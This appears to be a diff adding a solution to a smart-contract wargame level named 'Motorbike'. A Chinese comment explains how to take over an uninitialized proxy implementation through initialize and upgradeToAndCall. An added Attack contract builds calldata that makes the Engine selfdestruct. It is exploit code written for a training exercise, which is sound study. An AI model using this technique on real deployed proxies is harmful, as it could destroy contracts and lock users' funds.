@@ -5,6 +5,16 @@ pragma solidity <0.7.0;
 import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/utils/Address.sol";
 import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/proxy/Initializable.sol";
 
+/**
+ * 通关条件：自毁Engine
+ * 本合约所有操作均通过fallback调用_delegate
+ * 思路：
+ * 1.部署一个攻击合约，其中包含自毁函数
+ * 2.await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")获取engine地址
+ * 3.调用engine的initialize，此时为upgrader为player，可以调用upgradeToAndCall了
+ * 4.构建调用合约的data(Attack.getData)
+ * 5.向Motorbike发送交易。PS：在remix调用失败，在浏览器使用await web3.eth.sendTransaction({from:player,to:engine,data:data})成功
+ */
 contract Motorbike {
     // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
     bytes32 internal constant _IMPLEMENTATION_SLOT =
@@ -105,5 +115,17 @@ contract Engine is Initializable {
             r_slot := _IMPLEMENTATION_SLOT
         }
         r.value = newImplementation;
+    }
+}
+
+contract Attack {
+    function destory(address payable addr) public {
+        selfdestruct(addr);
+    }
+
+    function getData() public view returns(bytes memory) {
+        bytes memory data1 = abi.encodeWithSignature("destory(address)", msg.sender);
+        bytes memory data2 = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this), data1);
+        return data2;
     }
 }
